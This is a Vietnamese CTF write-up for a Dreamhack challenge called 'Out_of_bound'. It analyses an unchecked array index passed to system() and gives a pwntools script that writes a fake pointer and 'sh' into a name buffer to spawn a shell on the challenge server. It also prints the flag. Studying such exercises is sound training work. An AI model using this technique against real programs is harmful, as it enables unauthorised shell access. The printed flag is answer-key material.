# [CTF] - [Out_of_bound]

> **Meta Info**
> - **Author:** Hoan (KMA)
> - **Difficulty:** Easy
> - **Flag:** `DH{2524e20ddeee45f11c8eb91804d57296}`

---

## PHẦN 1: PHÂN TÍCH BÀI (Challenge Analysis)

### 1. Thông tin chung & Checksec
- **File nhận được:** `Out_of_bound`, `Out_of_bound.c`
- **Kết quả checksec:**
  ```bash
      RELRO:    Partial RELRO
      Stack:    Canary found
      NX:       NX enabled
      PIE:      No PIE 

### 2. Phân tích tĩnh : 
- Chương trình có tạo 1 mảng kiểu char gồm nhiều phần tử :
```
char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
```
- Sau khi ta nhập `name` và `index` chương trình sẽ `call system` với `index` của mình đã nhập 
```
printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);
```
- Khả năng cao là tác giả muốn chạy system với những tham số khác ngoài `index` mảng cho trước 

## PHẦN 2: HƯỚNG VÀ CÁCH GIẢI :
---
### 1. Ý tưởng :
- Khi dịch ngược file có thể thấy cách nhảy `index` của chương trình :
```
system(*(char **)(command + index * 4));
```
- Có thể thấy rõ ta có thể nhảy vào bất cứ địa chỉ nào , cách nhảy đúng địa chỉ đó qua phéo tính đơn giản :

```
(địa chỉ đích - địa chỉ base) / 4 
```
- Thế là ta cần nhập địa chỉ `name+4 + sh\x00\x00` và sau đó tính khoảng cách từ đầu `command -> name ` cần nhập số bao nhiêu là lụm 

### 2. Kịch bản khai thác : 
```#!/usr/bin/env python3
from pwn import *

exe = ELF("./out_of_bound", checksec=False)
context.binary = exe

#p = process(exe.path)
p = remote('host3.dreamhack.games',9190)

payload = p32(0x804a0b0) + b'sh\x00\x00'
p.send(payload) 

p.sendlineafter(b'want?: ',b'19')

p.interactive()
```